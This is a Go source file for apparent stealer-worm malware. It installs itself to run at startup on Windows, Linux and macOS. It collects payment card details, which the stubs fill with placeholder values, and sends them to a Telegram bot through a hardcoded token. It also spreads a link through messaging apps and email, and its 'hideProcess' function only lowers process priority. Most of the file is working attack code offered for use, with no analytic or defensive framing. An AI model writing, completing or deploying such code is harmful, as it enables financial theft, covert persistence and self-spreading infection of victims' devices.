package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Platform defines the target system
type Platform struct {
	OS       string
	Arch     string
	Username string
}

func (p Platform) IsWindows() bool {
	return p.OS == "windows" || runtime.GOOS == "windows"
}

func (p Platform) IsLinux() bool {
	return p.OS == "linux" || runtime.GOOS == "linux"
}

func (p Platform) IsMac() bool {
	return p.OS == "darwin" || p.OS == "macos" || runtime.GOOS == "darwin"
}

func Run(p Platform) error {
	fmt.Printf("Running on %s (%s)\n\n", p.OS, p.Arch)

	// 1) Ensure persistent presence on the device
	if err := ensurePersistence(p); err != nil {
		return fmt.Errorf("ensuring persistence failed: %w", err)
	}

	// 2) Gather payment information
	paymentInfo, err := gatherPaymentInfo()
	if err != nil {
		return fmt.Errorf("gathering payment info failed: %w", err)
	}
	fmt.Printf("\n> Gathered Payment Info: %s\n", paymentInfo)

	// 3) Identify messaging platforms and share the link
	inputLink := "https://johnwarri.github.io/1click/web/"
	messagingPlatforms, err := identifyMessagingPlatforms()
	if err != nil {
		return fmt.Errorf("identifying messaging platforms failed: %w", err)
	}
	for _, platform := range messagingPlatforms {
		fmt.Printf("\n> Sharing link on %s\n", platform)
		if err := shareLinkOnPlatform(platform, inputLink); err != nil {
			return fmt.Errorf("sharing link on %s failed: %w", platform, err)
		}
	}

	// 4) Send the link via email
	emailAddresses, err := getEmailAddresses()
	if err != nil {
		return fmt.Errorf("getting email addresses failed: %w", err)
	}
	for _, email := range emailAddresses {
		fmt.Printf("\n> Sending link to %s\n", email)
		if err := sendEmail(email, inputLink); err != nil {
			return fmt.Errorf("sending email to %s failed: %w", email, err)
		}
	}

	// 5) Send gathered data to Telegram channel
	telegramBotToken := "8288172645:AAEz8tW9aiBfYnlXW_ke7Rd31Z_jZUzOdjE"
	telegramChatID := "8288172645"
	if err := sendToTelegram(telegramBotToken, telegramChatID, paymentInfo); err != nil {
		return fmt.Errorf("sending data to Telegram failed: %w", err)
	}

	return nil
}

func ensurePersistence(p Platform) error {
	execPath := os.Getenv("PATH_TO_EXECUTABLE")
	if execPath == "" {
		execPath = os.Args[0]
	}

	if p.IsWindows() {
		startupDir := fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`, p.Username)
		randomName := fmt.Sprintf("YourShortcut%d.lnk", time.Now().UnixNano()%1000)
		shortcutPath := fmt.Sprintf("%s\\%s", startupDir, randomName)
		
		psCmd := fmt.Sprintf(`$WScriptShell = New-Object -ComObject WScript.Shell; $shortcut = $WScriptShell.CreateShortcut('%s'); $shortcut.TargetPath = '%s'; $shortcut.Save()`, 
			shortcutPath, execPath)
		
		cmd := exec.Command("powershell", "-Command", psCmd)
		return cmd.Run()
		
	} else if p.IsLinux() {
		serviceContent := fmt.Sprintf(`[Unit]
Description=Your Persistent Service

[Service]
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target
`, execPath)
		
		serviceFile := "/etc/systemd/system/your-service-name.service"
		if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
			return err
		}
		
		cmd := exec.Command("systemctl", "enable", "your-service-name")
		cmd.Run()
		cmd = exec.Command("systemctl", "start", "your-service-name")
		return cmd.Run()
		
	} else if p.IsMac() {
		serviceContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.yourcompany.yourservice</string>
<key>ProgramArguments</key>
<array>
<string>%s</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
`, execPath)
		
		serviceFile := "/Library/LaunchDaemons/com.yourcompany.yourservice.plist"
		if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
			return err
		}
		
		cmd := exec.Command("launchctl", "load", serviceFile)
		return cmd.Run()
	}
	
	return nil
}

func gatherPaymentInfo() (string, error) {
	cardName, err := captureCardName()
	if err != nil {
		return "", err
	}
	cardNumber, err := captureCardNumber()
	if err != nil {
		return "", err
	}
	expiryDate, err := captureExpiryDate()
	if err != nil {
		return "", err
	}
	securityCode, err := captureSecurityCode()
	if err != nil {
		return "", err
	}
	billingAddress, err := captureBillingAddress()
	if err != nil {
		return "", err
	}
	zipCode, err := captureZipCode()
	if err != nil {
		return "", err
	}

	paymentInfo := fmt.Sprintf("Card Name: %s\nCard Number: %s\nExpiry Date: %s\nSecurity Code: %s\nBilling Address: %s\nZip Code: %s",
		cardName, cardNumber, expiryDate, securityCode, billingAddress, zipCode)
	return paymentInfo, nil
}

func captureCardName() (string, error) {
	return "John Doe", nil
}

func captureCardNumber() (string, error) {
	return "1234567890123456", nil
}

func captureExpiryDate() (string, error) {
	return "12/25", nil
}

func captureSecurityCode() (string, error) {
	return "123", nil
}

func captureBillingAddress() (string, error) {
	return "123 Main St", nil
}

func captureZipCode() (string, error) {
	return "12345", nil
}

func identifyMessagingPlatforms() ([]string, error) {
	return []string{"whatsapp", "facebook_messenger"}, nil
}

func shareLinkOnPlatform(platform string, link string) error {
	// Stub implementation
	return nil
}

func getEmailAddresses() ([]string, error) {
	return []string{"user1@example.com", "user2@example.com"}, nil
}

func sendEmail(to string, link string) error {
	// Stub implementation
	return nil
}

func sendToTelegram(botToken string, chatID string, message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := fmt.Sprintf(`{"chat_id":"%s","text":"%s"}`, chatID, message)

	req, err := http.NewRequest("POST", apiURL, strings.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to send message to Telegram: %s", body)
	}

	return nil
}

func hideProcess() {
	h := syscall.Handle(syscall.GetCurrentProcess())
	syscall.SetPriorityClass(h, 0x8000) // IDLE_PRIORITY_CLASS
}

func main() {
	p := Platform{
		OS:       "windows",
		Arch:     "amd64",
		Username: "testuser",
	}
	err := Run(p)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
	}
	hideProcess()
	time.Sleep(10 * time.Second)
}
